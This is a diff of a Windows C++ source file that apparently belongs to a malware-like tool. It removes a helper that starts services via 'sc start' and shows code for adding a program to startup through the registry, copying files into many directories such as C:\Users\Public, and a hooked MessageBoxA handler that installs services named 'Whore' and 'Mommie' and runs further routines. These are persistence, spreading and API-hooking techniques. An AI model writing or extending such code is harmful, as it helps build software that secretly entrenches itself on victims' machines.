@@ -1,18 +1,6 @@
 #include "../Headers/Tools.h"
 #include <unordered_map>
 
-void StartService(const std::wstring& serviceName) {
-    std::wstring command = L"sc start " + serviceName;
-    int result = _wsystem(command.c_str());
-
-    if (result == 0) {
-        std::wcout << L"Service started successfully: " << serviceName << std::endl;
-    }
-    else {
-        std::wcerr << L"Failed to start service: " << serviceName << std::endl;
-    }
-}
-
 void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     HKEY hKey = nullptr;
 
@@ -44,7 +32,6 @@ void addPathsRecursively(std::unordered_map<std::string, std::string>& paths, co
 }
 
 void write_file_to_dirs() {
-    Memory Memory;
     map<string, string> paths;
     // app different paths to the map
     paths["path_1"] = "C:\\Users\\Public\\";
@@ -107,6 +94,7 @@ int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR l
     Memory.InstallService(L"Whore", L"Whore Service");
     Memory.InstallService(L"Mommie", L"Mommie Service");
     cout << "Hooked to MessageBoxA" << endl;
+
     write_file_to_dirs();
     Main.Windows();
     // Call the original MessageBoxA function
